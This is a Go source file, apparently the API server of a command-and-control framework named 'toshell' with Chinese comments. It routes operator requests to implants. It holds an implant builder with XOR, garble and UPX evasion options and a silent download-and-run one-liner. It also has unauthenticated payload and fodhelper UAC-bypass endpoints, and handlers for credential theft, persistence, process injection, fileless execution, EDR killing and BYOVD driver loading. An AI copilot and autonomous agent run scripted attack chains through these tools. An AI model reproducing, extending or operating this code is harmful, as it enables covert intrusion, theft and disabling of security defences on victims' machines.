package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"toshell/internal/common/tunnel"
	"toshell/internal/common/types"
	"toshell/internal/server/ai"
	"toshell/internal/server/auth"
	"toshell/internal/server/builder"
	"toshell/internal/server/config"
	"toshell/internal/server/logging"
	"toshell/internal/server/session"
	"toshell/internal/server/task"
)

// ─── Core Types ────────────────────────────────────────────────────────────────

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type BuildRequest struct {
	ID           string `json:"id"`
	Name         string `json:"name"`
	Format       string `json:"format"`
	Language     string `json:"language"` // go(默认) / c（C 植入端，体积极小，仅 Windows）
	ListenerID   string `json:"listener_id"`
	ServerURL    string `json:"server_url"`
	Protocol     string `json:"protocol"`
	Interval     uint32 `json:"interval"`
	Jitter       uint32 `json:"jitter"`
	RetryCount   uint32 `json:"retry_count"`
	RetryWait    uint32 `json:"retry_wait"`
	KillDate     string `json:"kill_date"`
	WorkingHours string `json:"working_hours"`
	RelayListen  string `json:"relay_listen"`
	FrontDomain  string `json:"front_domain"`
	Profile      string `json:"profile"` // full(默认) / light(精简减体积)
	OutputPath   string `json:"output_path"`
	OS           string `json:"os"`
	Arch         string `json:"arch"`
	// Evasion options
	XOREncrypt   bool `json:"xor_encrypt"`
	XORKeySize   int  `json:"xor_key_size"`
	GarbleEnable bool `json:"garble_enabled"`
	UPXEnable    bool `json:"upx_enabled"`
}

type BuildResponse struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Format      string `json:"format"`
	Size        int    `json:"size"`
	SHA256      string `json:"sha256"`
	BuildTime   string `json:"build_time"`
	DownloadURL string `json:"download_url"`
	// OneLiner 一条命令上线：直接复制到目标机执行即可静默下载并运行载荷（仅 exe/raw 生效）
	OneLiner string `json:"one_liner"`
}

type ImplantsInfo struct {
	Name    string `json:"name"`
	Size    int64  `json:"size"`
	ModTime string `json:"mod_time"`
	Format  string `json:"format"`
}

type TaskPusher interface {
	PushTask(sessionID string, taskInfo *types.TaskInfo) error
	PushFileUpload(sessionID, uploadID, filename, targetPath string, size int64, taskID uint64) error
	SendTunnelPacket(sessionID string, tunnelPacket *tunnel.TunnelPacket) error
	SendTunnelRaw(sessionID string, rawPacket []byte) error
	ListRelayNodes() []types.RelayNode
}

type Server struct {
	router        *mux.Router
	httpServer    *http.Server
	sessionMgr    *session.Manager
	taskMgr       *task.Manager
	auth          *auth.Auth
	builder       *builder.Builder
	cfg           *config.Config
	listener      TaskPusher
	startTime     time.Time
	tunnelMgr     *tunnel.TunnelManager
	socks5Servers map[string]*tunnel.SOCKS5Server
	socks5Mu      sync.RWMutex
	wsHub         *WSHub
	webFS         http.FileSystem // 嵌入式前端文件系统（nil = 未嵌入）
	copilot       *ai.Copilot     // AI 副驾驶（LLM 聊天 + 工具调用；nil = 未配置）
	playbookR     *ai.PlaybookRunner // 剧本化执行引擎（确定性攻击链）
	agentMgr      *ai.AgentManager  // 异步自主 Agent 运行时（run 生命周期 + 并发上限）
	// onConfigApplied 配置保存并热应用后的回调（由服务器主循环注册，
	// 用于通知各组件如 HTTP listener 拟态模板切换）。
	onConfigApplied func(cfg *config.Config)
}

// SetOnConfigApplied 注册配置热应用回调（设置 API 保存后触发）。
func (s *Server) SetOnConfigApplied(cb func(cfg *config.Config)) {
	s.onConfigApplied = cb
}

// ─── Lifecycle ─────────────────────────────────────────────────────────────────

func New(cfg *config.Config, sessMgr *session.Manager, taskMgr *task.Manager) *Server {
	b := builder.New()
	server := &Server{
		router:        mux.NewRouter(),
		sessionMgr:    sessMgr,
		taskMgr:       taskMgr,
		auth:          auth.New(&cfg.Auth),
		builder:       b,
		cfg:           cfg,
		startTime:     time.Now(),
		listener:      newListenerRouter(sessMgr),
		tunnelMgr:     tunnel.NewTunnelManager(),
		socks5Servers: make(map[string]*tunnel.SOCKS5Server),
		wsHub:         NewWSHub(),
	}
	// AI 副驾驶：executor 为 Server 自身（复用 MCP 工具实现）
	server.copilot = ai.New(cfg.AI, server)
	// 异步自主 Agent 运行时：并发上限由 config.AI.AgentConcurrency 决定（默认 2）
	server.agentMgr = ai.NewAgentManager(cfg.AI.AgentConcurrency)
	// 剧本化执行引擎：executor 同样复用 Server 的 invokeTool（MCP 工具面）
	server.playbookR = ai.NewPlaybookRunner(server)
	// 剧本完成后自动生成 AI 总结建议（复用副驾驶 LLM，未配置则跳过）
	server.playbookR.SetAnalyzer(server.analyzePlaybook)
	// 任务流/模板合并到剧本：按 id 动态解析模板为剧本
	server.playbookR.SetPlaybookResolver(server.resolveTemplatePlaybook)
	// 首次启动把内置剧本 seed 成可编辑/删除的任务模板（初始示例），
	// 使副驾驶与任务模板页都以数据库模板为主
	server.seedBuiltinTemplates()

	go server.wsHub.Run()

	server.setupRoutes()
	return server
}

// SetListener 设置默认监听器（配置文件启动的监听器，main.go 调用）。
// 所有按会话路由的推送在未命中运行时监听器时回退到该默认监听器。
func (s *Server) SetListener(l TaskPusher) {
	if r, ok := s.listener.(*listenerRouter); ok {
		r.SetDefault(l)
	} else {
		s.listener = l
	}
}

// RegisterRuntimeListener 注册一个已启动的监听器实例（main.go 的默认监听器
// 或 API 动态创建的），使其可被 Web 界面停止/删除，并参与会话推送路由。
func (s *Server) RegisterRuntimeListener(id string, p TaskPusher, stop func()) {
	if r, ok := s.listener.(*listenerRouter); ok {
		r.register(&runtimeListener{id: id, pusher: p, stop: stop})
	}
}

// UnregisterRuntimeListener 注销并停止一个运行时监听器实例（返回是否命中）。
func (s *Server) UnregisterRuntimeListener(id string) bool {
	r, ok := s.listener.(*listenerRouter)
	if !ok {
		return false
	}
	r.mu.Lock()
	_, exists := r.runtimes[id]
	r.mu.Unlock()
	r.unregister(id)
	return exists
}

// StopSOCKS5ForSession 停止指定 session 的 SOCKS5 代理服务器（session 断连时调用）
func (s *Server) StopSOCKS5ForSession(sessionID string) {
	s.socks5Mu.Lock()
	defer s.socks5Mu.Unlock()

	if socks5, exists := s.socks5Servers[sessionID]; exists {
		fmt.Printf("[INFO] [api] Session %s disconnected, stopping SOCKS5 proxy on port %d\n", sessionID, socks5.GetPort())
		socks5.Stop()
		delete(s.socks5Servers, sessionID)
	}
}

// SetWebFS 设置嵌入的前端文件系统（服务端二进制嵌入前端时使用）
func (s *Server) SetWebFS(fs http.FileSystem) {
	s.webFS = fs
}

// BroadcastTaskEvent sends a task result event to all WebSocket frontend clients.
func (s *Server) BroadcastTaskEvent(eventType string, taskID uint64, sessionID string, taskType string, exitCode int32, output string, errorMsg string) {
	if s.wsHub == nil {
		return
	}
	payload := map[string]interface{}{
		"task_id":    taskID,
		"session_id": sessionID,
		"task_type":  taskType,
		"exit_code":  exitCode,
	}
	if output != "" {
		payload["output"] = output
	}
	if errorMsg != "" {
		payload["error"] = errorMsg
	}
	s.wsHub.Broadcast(WSEvent{
		Type:    eventType,
		Payload: payload,
	})
}

// BroadcastScreenFrame broadcasts a real-time screen stream frame to all WebSocket clients.
// payload 是植入端截图 JSON（{image, format, width, height}），附加 session_id 后透传。
func (s *Server) BroadcastScreenFrame(sessionID string, payload []byte) {
	if s.wsHub == nil {
		return
	}
	var frame map[string]interface{}
	if err := json.Unmarshal(payload, &frame); err != nil {
		return
	}
	frame["session_id"] = sessionID
	s.wsHub.Broadcast(WSEvent{
		Type:    "screen_frame",
		Payload: frame,
	})
}

func (s *Server) Start(addr string) error {
	// 应用配置的超时（此前 http.Server 无任何超时 → slowloris 可拖垮管理 API）
	readTimeout := s.cfg.Server.ReadTimeout
	if readTimeout <= 0 {
		readTimeout = 30 * time.Second
	}
	writeTimeout := s.cfg.Server.WriteTimeout
	if writeTimeout <= 0 {
		writeTimeout = 30 * time.Second
	}
	idleTimeout := s.cfg.Server.IdleTimeout
	if idleTimeout <= 0 {
		idleTimeout = 120 * time.Second
	}
	s.httpServer = &http.Server{
		Addr:         addr,
		Handler:      recoverMiddleware(s.router),
		ReadTimeout:  readTimeout,
		WriteTimeout: writeTimeout,
		IdleTimeout:  idleTimeout,
	}
	return s.httpServer.ListenAndServe()
}

// recoverMiddleware 全局 panic 兜底：任何 handler panic 只返回 500，
// 绝不杀死整个进程（此前 handlers_implant.go 的 body[:8] 可直接远程打崩服务）。
func recoverMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if rec := recover(); rec != nil {
				logging.Error("api", "panic recovered: %v (path=%s)", rec, r.URL.Path)
				http.Error(w, `{"error":"internal server error"}`, http.StatusInternalServerError)
			}
		}()
		next.ServeHTTP(w, r)
	})
}

func (s *Server) Stop() error {
	if s.httpServer != nil {
		return s.httpServer.Close()
	}
	return nil
}

// ─── Routes ────────────────────────────────────────────────────────────────────

func (s *Server) setupRoutes() {
	s.router.HandleFunc("/api/v1/health", s.healthHandler).Methods("GET")

	implant := s.router.PathPrefix("/api/v1/implant").Subrouter()
	implant.HandleFunc("/register", s.implantRegisterHandler).Methods("POST")
	implant.HandleFunc("/heartbeat", s.implantHeartbeatHandler).Methods("POST")
	implant.HandleFunc("/result", s.implantResultHandler).Methods("POST")
	// 免认证载荷下载端点：供"一条命令上线"在目标机上直接拉取 exe（无 token 可用）。
	implant.HandleFunc("/payload/{id}", s.downloadStoredImplantHandler).Methods("GET")
	// 免认证一次性 UAC 提权载荷（fodhelper 拉起的高完整性进程无 token）。
	implant.HandleFunc("/uac/{token}", s.uacPayloadHandler).Methods("GET")

	api := s.router.PathPrefix("/api/v1").Subrouter()

	if s.auth != nil {
		api.Use(s.auth.Middleware())
	}

	api.HandleFunc("/login", s.loginHandler).Methods("POST")

	api.HandleFunc("/sessions", s.listSessionsHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}", s.getSessionHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}", s.updateSessionHandler).Methods("PATCH")
	api.HandleFunc("/sessions/{id}", s.deleteSessionHandler).Methods("DELETE")
	api.HandleFunc("/sessions/{id}/capabilities", s.sessionCapabilitiesHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/interact", s.interactSessionHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/files", s.listFilesHandler).Methods("GET", "POST")
	api.HandleFunc("/sessions/{id}/files/download", s.downloadFileHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/files/upload", s.uploadFileHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/files/delete", s.deleteFileHandler).Methods("POST")
	api.HandleFunc("/files/transfer", s.transferFileHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/processes", s.listProcessesHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/processes/{pid}", s.killProcessHandler).Methods("DELETE")
	api.HandleFunc("/sessions/{id}/inject", s.processInjectHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/bof", s.loadBofHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/shell", s.shellWebSocketHandler).Methods("GET")

	api.HandleFunc("/tasks", s.listTasksHandler).Methods("GET")
	api.HandleFunc("/tasks/stats", s.taskStatsHandler).Methods("GET")
	api.HandleFunc("/tasks", s.createTaskHandler).Methods("POST")
	api.HandleFunc("/tasks/{id}", s.getTaskHandler).Methods("GET")
	api.HandleFunc("/tasks/{id}", s.deleteTaskHandler).Methods("DELETE")
	api.HandleFunc("/tasks/{id}/cancel", s.cancelTaskHandler).Methods("POST")
	// AI 副驾驶 MCP 工具端点
	api.HandleFunc("/mcp/tools", s.mcpToolsHandler).Methods("GET")
	api.HandleFunc("/mcp/tools/{name}", s.mcpToolInvokeHandler).Methods("POST")
	api.HandleFunc("/intel", s.listIntelHandler).Methods("GET")
	// AI 副驾驶聊天端点
	api.HandleFunc("/copilot/status", s.copilotStatusHandler).Methods("GET")
	api.HandleFunc("/copilot/chat", s.copilotChatHandler).Methods("POST")
	api.HandleFunc("/copilot/consent", s.copilotConsentHandler).Methods("POST")
	// 异步自主 Agent 端点（非阻塞：创建即返回 run_id，事件走 SSE）
	api.HandleFunc("/agent/chat", s.agentChatHandler).Methods("POST")
	api.HandleFunc("/agent/runs/{id}", s.agentRunHandler).Methods("GET")
	api.HandleFunc("/agent/runs/{id}/events", s.agentEventsHandler).Methods("GET")
	api.HandleFunc("/agent/runs/{id}/cancel", s.agentCancelHandler).Methods("POST")
	api.HandleFunc("/agent/runs/{id}/consent", s.agentConsentHandler).Methods("POST")
	// 副驾驶剧本化端点
	api.HandleFunc("/copilot/playbooks", s.listPlaybooksHandler).Methods("GET")
	api.HandleFunc("/copilot/playbook/run", s.runPlaybookHandler).Methods("POST")
	api.HandleFunc("/copilot/playbook/runs", s.listPlaybookRunsHandler).Methods("GET")
	api.HandleFunc("/copilot/playbook/runs/{id}", s.getPlaybookRunHandler).Methods("GET")

	// 通道健康仪表板
	api.HandleFunc("/channels/health", s.channelsHealthHandler).Methods("GET")

	api.HandleFunc("/builders", s.listBuildersHandler).Methods("GET")
	api.HandleFunc("/builders", s.createBuilderHandler).Methods("POST")
	api.HandleFunc("/builders/download", s.downloadPayloadHandler).Methods("POST")
	api.HandleFunc("/implants", s.listImplantsHandler).Methods("GET")
	api.HandleFunc("/implants/download/{name}", s.downloadImplantHandler).Methods("GET")
	api.HandleFunc("/implants/stored", s.listStoredImplantsHandler).Methods("GET")
	api.HandleFunc("/implants/stored/{id}", s.downloadStoredImplantHandler).Methods("GET")
	api.HandleFunc("/implants/{id}", s.deleteStoredImplantHandler).Methods("DELETE")

	api.HandleFunc("/logs", s.listLogsHandler).Methods("GET")
	api.HandleFunc("/system/stats", s.systemStatsHandler).Methods("GET")

	api.HandleFunc("/ws/events", s.wsHub.ServeWS).Methods("GET")

	api.HandleFunc("/tunnels", s.listTunnelsHandler).Methods("GET")
	api.HandleFunc("/tunnels", s.createTunnelHandler).Methods("POST")
	api.HandleFunc("/tunnels/{id}", s.closeTunnelHandler).Methods("DELETE")

	api.HandleFunc("/plugins", s.listPluginsHandler).Methods("GET")
	api.HandleFunc("/plugins", s.uploadPluginHandler).Methods("POST")
	api.HandleFunc("/plugins/{id}", s.getPluginHandler).Methods("GET")
	api.HandleFunc("/plugins/{id}", s.deletePluginHandler).Methods("DELETE")
	api.HandleFunc("/plugins/refresh", s.refreshPluginsHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/plugin", s.loadPluginHandler).Methods("POST")

	api.HandleFunc("/injection/methods", s.listInjectionMethodsHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/injection", s.executeInjectionHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/auto-inject", s.autoInjectHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/spawn", s.spawnHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/fileless-exec", s.filelessExecHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/privesc-uac", s.privescUACHandler).Methods("POST")

	api.HandleFunc("/sessions/{id}/persistence", s.listPersistenceHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/persistence/install", s.installPersistenceHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/persistence/remove", s.removePersistenceHandler).Methods("POST")

	api.HandleFunc("/sessions/{id}/credentials", s.credentialsHandler).Methods("POST")

	api.HandleFunc("/sessions/{id}/screenshot", s.takeScreenshotHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/screen-stream", s.screenStreamHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/relay", s.relayControlHandler).Methods("POST")
	api.HandleFunc("/relay-nodes", s.listRelayNodesHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/edr/blind", s.edrBlindHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/edr/kill", s.edrKillHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/edr/byovd-load", s.byovdLoadHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/edr/byovd-unload", s.byovdUnloadHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/edr/ppl-kill", s.pplKillHandler).Methods("POST")
	api.HandleFunc("/drivers", s.listDriversHandler).Methods("GET")
	api.HandleFunc("/drivers/{name}/raw", s.downloadDriverHandler).Methods("GET")
	api.HandleFunc("/settings", s.getSettingsHandler).Methods("GET")
	api.HandleFunc("/settings", s.updateSettingsHandler).Methods("PUT")
	api.HandleFunc("/settings/webhook/test", s.testWebhookHandler).Methods("POST")

	api.HandleFunc("/listeners", s.listListenersHandler).Methods("GET")
	api.HandleFunc("/listeners", s.createListenerHandler).Methods("POST")
	api.HandleFunc("/listeners/{id}", s.getListenerHandler).Methods("GET")
	api.HandleFunc("/listeners/{id}", s.updateListenerHandler).Methods("PUT")
	api.HandleFunc("/listeners/{id}/start", s.startListenerHandler).Methods("POST")
	api.HandleFunc("/listeners/{id}/stop", s.stopListenerHandler).Methods("POST")
	api.HandleFunc("/listeners/{id}", s.deleteListenerHandler).Methods("DELETE")

	api.HandleFunc("/templates", s.listTemplatesHandler).Methods("GET")
	api.HandleFunc("/templates", s.createTemplateHandler).Methods("POST")
	api.HandleFunc("/templates/{id}", s.getTemplateHandler).Methods("GET")
	api.HandleFunc("/templates/{id}", s.updateTemplateHandler).Methods("PUT")
	api.HandleFunc("/templates/{id}", s.deleteTemplateHandler).Methods("DELETE")
	api.HandleFunc("/sessions/{id}/workflow", s.executeWorkflowHandler).Methods("POST")
	api.HandleFunc("/workflows/{id}", s.getWorkflowStatusHandler).Methods("GET")

	// SPA 前端 — 嵌入在二进制中，非 API 路径回退到 index.html
	s.router.PathPrefix("/").Handler(s.serveSPA())
}

// ─── Utilities ─────────────────────────────────────────────────────────────────

func extractRequestHost(r *http.Request) string {
	if r.Host != "" {
		host, _, err := net.SplitHostPort(r.Host)
		if err != nil {
			host = r.Host
		}
		if host != "" && host != "localhost" && host != "127.0.0.1" && host != "0.0.0.0" && host != "::1" {
			return host
		}
	}
	if xfh := r.Header.Get("X-Forwarded-Host"); xfh != "" {
		host, _, err := net.SplitHostPort(xfh)
		if err != nil {
			host = strings.SplitN(xfh, ":", 2)[0]
		}
		if host != "" {
			return host
		}
	}
	return ""
}

func (s *Server) rewriteShellcodeServerURL(shellcodeB64 string, callbackHost ...string) (string, error) {
	raw, err := base64.StdEncoding.DecodeString(shellcodeB64)
	if err != nil {
		return shellcodeB64, fmt.Errorf("base64 decode failed: %w", err)
	}

	cfg := s.cfg
	listenerHost := ""
	if len(callbackHost) > 0 && callbackHost[0] != "" {
		listenerHost = callbackHost[0]
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Listener.Host
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Server.Host
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		return shellcodeB64, nil
	}

	scheme := "http"
	if cfg.Listener.TLSEnabled {
		scheme = "https"
	}
	serverURL := fmt.Sprintf("%s://%s:%d", scheme, listenerHost, cfg.Listener.Port)
	encKeyB64 := base64.StdEncoding.EncodeToString([]byte(cfg.Listener.EncryptionKey))

	raw = builder.AppendConfigToShellcode(raw, serverURL, encKeyB64)
	return base64.StdEncoding.EncodeToString(raw), nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ─── Persistence Handlers ──────────────────────────────────────────────────────

func (s *Server) listPersistenceHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: "persistence",
		Data:     `{"action":"list"}`,
	})
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id": taskInfo.ID,
		"message": "Persistence list task sent",
	})
}

func (s *Server) installPersistenceHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Method string `json:"method"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request"}`, http.StatusBadRequest)
		return
	}

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	installData, _ := json.Marshal(map[string]string{
		"action": "install",
		"method": req.Method,
	})

	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: "persistence",
		Data:     string(installData),
	})
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Persistence install (%s) pushed to session %s", req.Method, id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id": taskInfo.ID,
		"method":  req.Method,
		"message": "Persistence install task pushed",
	})
}

func (s *Server) removePersistenceHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: "persistence",
		Data:     `{"action":"remove"}`,
	})
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Persistence remove pushed to session %s", id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id": taskInfo.ID,
		"message": "Persistence removal task pushed",
	})
}

// ─── SPA File Server ────────────────────────────────────────────────────────────

// serveSPA 返回 SPA 文件服务器 handler，使用嵌入的前端文件系统。
// 非 API 路径 -> 尝试服务静态文件 -> 回退到 index.html（前端路由）。
//
// 注意：必须在请求时才读取 s.webFS——setupRoutes 在 api.New 中就会调用本方法，
// 而 SetWebFS 由调用方在 New 之后才注入，若在方法内提前求值会得到 nil 并固定
// 注册 NotFoundHandler，导致前端永远 404。
func (s *Server) serveSPA() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		wfs := s.webFS
		if wfs == nil {
			http.NotFound(w, r)
			return
		}
		fileServer := http.FileServer(wfs)

		if strings.HasPrefix(r.URL.Path, "/api/") {
			http.NotFound(w, r)
			return
		}
		// 尝试直接服务文件
		f, err := wfs.Open(r.URL.Path)
		if err == nil {
			f.Close()
			// Vite 构建的 /assets/* 文件名带内容 hash，可永久缓存；
			// 其余文件（index.html 等）每次重新验证，保证前端更新即时生效。
			if strings.HasPrefix(r.URL.Path, "/assets/") {
				w.Header().Set("Cache-Control", "public, max-age=31536000, immutable")
			} else {
				w.Header().Set("Cache-Control", "no-cache")
			}
			fileServer.ServeHTTP(w, r)
			return
		}
		// SPA fallback: 返回 index.html（前端路由处理）。
		// 注意不能用 http.ServeFile——它会访问磁盘文件系统，而前端是嵌入的。
		if _, err := wfs.Open("index.html"); err == nil {
			w.Header().Set("Cache-Control", "no-cache")
			r.URL.Path = "/"
			fileServer.ServeHTTP(w, r)
			return
		}
		http.NotFound(w, r)
	})
}
